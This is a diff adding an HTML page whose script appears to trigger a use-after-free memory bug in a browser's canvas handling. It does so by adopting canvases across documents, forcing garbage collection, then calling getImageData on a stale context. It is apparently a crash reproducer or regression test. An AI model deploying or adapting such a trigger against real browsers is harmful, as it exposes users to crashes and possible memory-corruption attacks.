@@ -1,0 +1,31 @@
+<html>
+	<script>
+
+var o = {};
+function uaf(){
+	o[5].getImageData(2, 1, 7, 6);
+}
+
+function gc() {
+    for (let i = 0; i < 10; i++) {
+        new ArrayBuffer(1024 * 1024 * 10);
+    }
+}
+
+
+o[1] = document.createElementNS('http://www.w3.org/1999/xhtml', 'canvas');
+o[2] = document.createElementNS('http://www.w3.org/1999/xhtml', 'canvas');
+o[3] = document.createElementNS('http://www.w3.org/1999/xhtml', 'canvas');
+
+o[4] = o[2].getContext('2d', { willReadFrequently: false, alpha: true });
+o[1].appendChild(o[3]);
+document.implementation.createDocument("", "", null).adoptNode(o[1]);
+o[5] = o[3].getContext('2d', { willReadFrequently: false, alpha: false });
+document.documentElement.appendChild(o[1]);
+o[2].width = 65535;
+o[4].fillText("aaa",0.0,8)
+setInterval(gc, 5000);
+setTimeout(uaf, 6300);
+
+	</script>
+<html>
